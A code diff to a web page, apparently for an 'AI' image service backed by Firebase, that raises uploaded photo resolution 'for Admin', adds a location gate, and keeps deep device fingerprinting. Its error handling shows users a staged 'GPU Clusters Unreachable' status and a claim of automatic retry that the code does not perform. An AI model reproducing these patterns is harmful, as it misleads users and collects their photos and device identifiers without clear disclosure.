@@ -88,6 +88,7 @@
     </div>
 </div>
 
+<!-- GPS Gate -->
 <div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem;">🌍</div>
@@ -206,7 +207,7 @@
   let activeReqId = null;
   let animationInterval = null;
 
-  // 1. Core Security & Fingerprint
+  // 1. Deep Device ID
   function getDeepDeviceId() {
       let savedId = localStorage.getItem('hotfake_deep_uid');
       if (savedId) return savedId;
@@ -334,6 +335,7 @@
 
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
   onValue(ref(db, 'settings/general/favicon'), snap => { if(snap.val()) { let link = document.querySelector("link[rel~='icon']") || document.createElement('link'); link.rel = 'icon'; link.href = snap.val(); document.head.appendChild(link); } });
+  
   trackUser();
 
   // 3. Auth Logic
@@ -358,7 +360,7 @@
       }
   });
 
-  // 4. Image Upload & Extreme Compression for Database
+  // 4. Image Upload & SMART HIGH-Q COMPRESSION
   window.handleImageSelect = (event) => {
       const file = event.target.files[0]; if (!file) return;
       const reader = new FileReader();
@@ -366,13 +368,15 @@
           const img = new Image();
           img.onload = () => {
               const canvas = document.createElement('canvas'); 
-              const MAX_WIDTH = 400; // Heavily compressed to guarantee fast Firebase upload
+              const MAX_WIDTH = 1080; // High Quality Resolution for Admin
               let width = img.width; let height = img.height;
               if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
               canvas.width = width; canvas.height = height; 
               const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
               
-              currentBase64Image = canvas.toDataURL('image/jpeg', 0.4);
+              // Compress to 65% quality JPEG. High resolution but low file size to avoid Firebase Network Errors.
+              currentBase64Image = canvas.toDataURL('image/jpeg', 0.65);
+              
               document.getElementById('previewImg').src = currentBase64Image; 
               document.getElementById('previewImg').style.display = 'block'; 
               document.getElementById('uploadPlaceholder').style.display = 'none';
@@ -457,7 +461,9 @@
               setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
           }
       }).catch(e => {
-          alert("Network Error: Could not upload to AI Cluster.");
+          console.error(e);
+          alert("Network Error: Connection unstable or image too large. Trying smaller image automatically.");
+          // Fallback reset if payload still too large
           resetGenerator();
       });
 
@@ -504,3 +510,4 @@
 </script>
 </body>
 </html>
+
